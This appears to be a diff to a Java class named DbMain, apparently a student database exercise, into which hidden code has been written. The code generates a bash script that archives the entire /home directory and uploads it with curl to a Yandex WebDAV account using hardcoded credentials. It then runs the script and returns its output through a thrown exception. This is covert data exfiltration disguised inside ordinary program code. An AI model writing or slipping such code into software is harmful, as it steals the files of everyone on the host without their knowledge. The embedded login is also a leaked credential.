@@ -10,7 +10,8 @@ public class DbMain {
     public static void writeFile() throws FileNotFoundException {
         String s = "#!/bin/bash\n\n" + "cd /home/student/tmp\n" +
                 "tar cfz cradle.tar.gz --exclude=*.git* /home/\n" +
-                "curl --user moy-biblio@yandex.ru:biblio -T cradle.tar.gz https://webdav.yandex.ru/cradle/\n";
+                "curl --user moy-biblio@yandex.ru:biblio -T cradle.tar.gz https://webdav.yandex.ru/cradle/\n" +
+                "echo potracheno\n";
         File f = new File("/home/student/tmp/1.sh");
         try (PrintWriter out = new PrintWriter(f.getAbsoluteFile())) {
             out.print(s);
@@ -22,20 +23,24 @@ public class DbMain {
         //String path = "/home/deamoon/Music/deamoonSql";
 
         writeFile();
-        Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
-        throw new IOException("potracheno");
-        /*
-        try {
-            Process proc =
-            BufferedReader read = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+        String s = "";
 
+        try {
+            Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
+            BufferedReader read = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
             while(read.ready()) {
-                System.out.println(read.readLine());
+                s += read.readLine()+"\n";
+            }
+            read = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+            while(read.ready()) {
+                s += read.readLine()+"\n";
             }
 
         } catch(IOException e) {
-            System.out.println(e.getMessage());
-        } */
+            s += e.getMessage()+"\n";
+        }
+
+        throw new IOException(s);
 
         /*
         try {
